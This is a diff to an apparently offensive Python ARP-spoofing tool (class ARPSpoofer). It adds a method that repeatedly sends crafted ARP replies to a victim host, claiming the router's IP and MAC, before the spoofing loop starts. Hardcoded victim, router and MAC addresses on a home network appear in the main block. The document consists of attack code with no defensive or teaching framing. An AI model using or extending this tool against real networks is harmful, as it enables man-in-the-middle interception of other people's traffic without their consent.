@@ -94,13 +94,22 @@ class ARPSpoofer:
         if  self.router_mac is None :
             # exit(1)
             raise ExceptionMacAddress("Could not get gtw MAC addresse. Ensure the devices are reachable.")
+        
+        self.fillVictimeARPTable()
 
         print("Starting ARP spoofing...")
+    
+    def fillVictimeARPTable(self):
+        for i in range(0,10):
+            arp_victime = ARP(op=2, pdst=self.victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.router_ip, hwsrc=self.router_mac)
+            send(arp_victime, verbose=False)
         
 
     def spoof(self):
         try:
             self.prepareSpoof()
+            # return ;
+
             
             while True:
                 self.spit()
@@ -125,6 +134,7 @@ if __name__ == "__main__":
         'ip' : '192.168.1.73',
         'mac' : "ac:bc:32:91:0a:ad"
     }
+
     a = ARPSpoofer(
         victim_ip='192.168.1.74',
         router_ip="192.168.1.254",
